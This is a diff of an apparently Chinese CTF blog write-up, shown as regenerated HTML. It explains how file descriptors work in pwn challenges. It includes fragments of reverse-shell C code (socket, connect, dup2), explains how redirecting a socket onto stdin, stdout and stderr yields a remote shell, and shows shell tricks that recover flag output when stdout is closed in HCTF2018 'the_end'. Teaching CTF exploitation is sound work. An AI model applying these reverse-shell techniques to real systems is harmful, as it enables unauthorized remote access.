+</span><span class="c1"></span>   <span class="mi">2</span>   <span class="err">│</span> <span class="err">#</span><span class="n">include</span> <span class="o">&lt;</span><span class="n">sys</span><span class="o">/</span><span class="n">types</span><span class="p">.</span><span class="n">h</span><span class="o">&gt;</span>
+   <span class="mi">3</span>   <span class="err">│</span> <span class="err">#</span><span class="n">include</span> <span class="o">&lt;</span><span class="n">sys</span><span class="o">/</span><span class="n">socket</span><span class="p">.</span><span class="n">h</span><span class="o">&gt;</span>
+   <span class="mi">4</span>   <span class="err">│</span> <span class="err">#</span><span class="n">include</span> <span class="o">&lt;</span><span class="n">netinet</span><span class="o">/</span><span class="n">in</span><span class="p">.</span><span class="n">h</span><span class="o">&gt;</span>
+   <span class="mi">5</span>   <span class="err">│</span> 
+   <span class="mi">6</span>   <span class="err">│</span> <span class="err">#</span><span class="n">define</span> <span class="nb">NULL</span> <span class="mi">0</span>
+   <span class="mi">7</span>   <span class="err">│</span> 
    <span class="mi">8</span>   <span class="err">│</span> <span class="kt">int</span> <span class="n">socket</span><span class="p">(</span><span class="kt">int</span> <span class="n">domain</span><span class="p">,</span> <span class="kt">int</span> <span class="n">type</span><span class="p">,</span> <span class="kt">int</span> <span class="n">protocal</span><span class="p">);</span>
    <span class="mi">9</span>   <span class="err">│</span> <span class="kt">int</span> <span class="n">connect</span><span class="p">(</span><span class="kt">int</span> <span class="n">sockfd</span><span class="p">,</span> <span class="k">const</span> <span class="k">struct</span> <span class="n">sockaddr</span> <span class="o">*</span><span class="n">addr</span><span class="p">,</span> <span class="n">socklen_t</span> <span class="n">addrlen</span><span class="p">);</span>
   <span class="mi">10</span>   <span class="err">│</span> <span class="kt">int</span> <span class="n">dup2</span><span class="p">(</span><span class="kt">int</span> <span class="n">oldfd</span><span class="p">,</span> <span class="kt">int</span> <span class="n">newfd</span><span class="p">);</span>
@@ -999,23 +959,20 @@ lsof    <span class="m">10598</span>  m4x    2u   CHR  <span class="m">136</span
   <span class="mi">49</span>   <span class="err">│</span> 
   <span class="mi">50</span>   <span class="err">│</span>        <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
   <span class="mi">51</span>   <span class="err">│</span> <span class="p">}</span>
-<span class="err">───────┴─────────────────────────────────────────────────────────────────────────────────</span></code></pre></td></tr></table>
+<span class="err">───────┴─────────────────────────────────────────────────────────────────────────────────</span>
+</code></pre></td></tr></table>
 </div>
-</div>
-<p>如果前两篇看懂的话，那么参考这个代码，reverse shell 的原理就很好理解了</p>
-
+</div><p>如果前两篇看懂的话，那么参考这个代码，reverse shell 的原理就很好理解了</p>
 <ol>
 <li>建立一个 socket，此时会新建一个 fd</li>
 <li>给这个 socket 分配 ip 和 port</li>
 <li>通过 dup2，将 socket 的 fd 复制到 0，1 和 2 上，这样 shell 的 io 就完全通过建立的 socket 了，这时如果我们监听这个 ip 和 port，就相当于拿到了一个 shell</li>
 </ol>
-
-<h2 id="level-4-hctf2018-the-end">level 4: HCTF2018 - the_end</h2>
-
+<h2 id="level-4-hctf2018---the_end">level 4: HCTF2018 - the_end</h2>
 <p><a href="https://veritas501.space">veritas501师傅</a> 出的题目，很独特，关闭了 stdout 和 stderr，但保留了 stdin。</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code class="language-C" data-lang="C"><span class="lnt"> 1
+<pre class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
@@ -1050,30 +1007,27 @@ lsof    <span class="m">10598</span>  m4x    2u   CHR  <span class="m">136</span
     <span class="n">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">buf</span><span class="p">,</span> <span class="mi">1uLL</span><span class="p">);</span>
   <span class="p">}</span>
   <span class="n">exit</span><span class="p">(</span><span class="mi">1337</span><span class="p">);</span>
-<span class="p">}</span></code></pre></td></tr></table>
+<span class="p">}</span>
+</code></pre></td></tr></table>
 </div>
-</div>
-<p>解法就不说了，可以参考 <a href="https://bysec.io/hctf/writeup.html#the-end">官方 writeup</a>。但更多人用的应该是非预期解直接使用 one_gadget。</p>
-
+</div><p>解法就不说了，可以参考 <a href="https://bysec.io/hctf/writeup.html#the-end">官方 writeup</a>。但更多人用的应该是非预期解直接使用 one_gadget。</p>
 <p>总之，可以用某种方式拿到一个交互式的 shell （因为 stdout 已经被关闭，所以不会有输出）。可以通过 <code>cat flag &gt;&amp;0</code>， <code>exec 1&gt;&amp;0; cat flag</code> 等方法得到 flag。</p>
-
 <p>为什么可以通过 <code>stdin</code> 来输出呢？因为</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code class="language-bash" data-lang="bash"><span class="lnt">1
+<pre class="chroma"><code><span class="lnt">1
 </span><span class="lnt">2
 </span></code></pre></td>
 <td class="lntd">
 <pre class="chroma"><code class="language-bash" data-lang="bash">~ file /proc/self/fd/0
-/proc/self/fd/0: symbolic link to /dev/pts/3</code></pre></td></tr></table>
+/proc/self/fd/0: symbolic link to /dev/pts/3
+</code></pre></td></tr></table>
 </div>
-</div>
-<p><code>stdin</code> 实际也是 pts 的软连接，因此可以输出。</p>
-
+</div><p><code>stdin</code> 实际也是 pts 的软连接，因此可以输出。</p>
 <p>需要注意的是，很多人在做这道题目时可能远程成功了，但本地使用 <code>pwnlib.process</code> 时失败，这是因为在 pwntools 的 <a href="https://github.com/Gallopsled/pwntools/blob/dev/pwnlib/tubes/tube.py#L798-L815">源码</a> 中有这样一段</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code class="language-python" data-lang="python"><span class="lnt"> 1
+<pre class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
@@ -1104,37 +1058,26 @@ lsof    <span class="m">10598</span>  m4x    2u   CHR  <span class="m">136</span
                     <span class="k">try</span><span class="p">:</span>
                         <span class="bp">self</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
                     <span class="k">except</span> <span class="ne">EOFError</span><span class="p">:</span>
-                        <span class="n">go</span><span class="o">.</span><span class="nb">set</span><span class="p">()</span>
+                        <span class="n">go</span><span class="o">.</span><span class="n">set</span><span class="p">()</span>
                         <span class="bp">self</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s1">&#39;Got EOF while sending in interactive&#39;</span><span class="p">)</span>
                 <span class="k">else</span><span class="p">:</span>
-                    <span class="n">go</span><span class="o">.</span><span class="nb">set</span><span class="p">()</span>
+                    <span class="n">go</span><span class="o">.</span><span class="n">set</span><span class="p">()</span>
         <span class="k">except</span> <span class="ne">KeyboardInterrupt</span><span class="p">:</span>
             <span class="bp">self</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s1">&#39;Interrupted&#39;</span><span class="p">)</span>
-            <span class="n">go</span><span class="o">.</span><span class="nb">set</span><span class="p">()</span></code></pre></td></tr></table>
+            <span class="n">go</span><span class="o">.</span><span class="n">set</span><span class="p">()</span>
+</code></pre></td></tr></table>
 </div>
-</div>
-<p><code>interactive()</code> 时程序试图从 1 读取内容，但此时只有 0，于是就触发了异常；但使用 <code>pwnlib.remote</code> 时是直接建立了一个 socket，因此不会触发异常（具体可以分析源码）</p>
-
+</div><p><code>interactive()</code> 时程序试图从 1 读取内容，但此时只有 0，于是就触发了异常；但使用 <code>pwnlib.remote</code> 时是直接建立了一个 socket，因此不会触发异常（具体可以分析源码）</p>
 <p>还要注意的是，当使用 <code>socat</code>，<code>xinted</code> 等挂载题目时，0, 1, 2 实际上已经不是 <code>stdin, stdout, stderr</code> 而是 socket 了，但因为端口转发的原因我们可以认为仍然是 <code>stdin, stdout, stderr</code>，这也提醒我们遇到和 fd 有关的题目时，可以本地挂载然后使用 <code>pwnlib.remote</code> 测试以减少不必要的麻烦。</p>
-
 <h2 id="references">References</h2>
-
 <p><a href="https://lordidiot.github.io/2018-09-03/tokyowesterns-ctf-2018-load-pwn/">https://lordidiot.github.io/2018-09-03/tokyowesterns-ctf-2018-load-pwn/</a></p>
-
 <p><a href="http://nano-chicken.blogspot.com/2014/07/linuxttyptypts.html">http://nano-chicken.blogspot.com/2014/07/linuxttyptypts.html</a></p>
-
 <p><a href="https://segmentfault.com/a/1190000009082089">https://segmentfault.com/a/1190000009082089</a></p>
-
 <p><a href="http://shell-storm.org/shellcode/files/shellcode-219.php">http://shell-storm.org/shellcode/files/shellcode-219.php</a></p>
-
 <p><a href="http://tacxingxing.com/2018/01/19/procfs/">http://tacxingxing.com/2018/01/19/procfs/</a></p>
-
 <p><a href="https://tdmathison.github.io/blog/slae32-1/">https://tdmathison.github.io/blog/slae32-1/</a></p>
-
 <p><a href="https://tdmathison.github.io/blog/slae32-2/">https://tdmathison.github.io/blog/slae32-2/</a></p>
-
 <p><a href="https://xz.aliyun.com/t/2548">https://xz.aliyun.com/t/2548</a></p>
-
 <p><a href="https://xz.aliyun.com/t/2549">https://xz.aliyun.com/t/2549</a></p>
 
     </div>
@@ -1271,7 +1214,7 @@ lsof    <span class="m">10598</span>  m4x    2u   CHR  <span class="m">136</span
     &copy;
     
        -
-    2019
+    2020
     <span class="heart">
       
       <i class="iconfont">
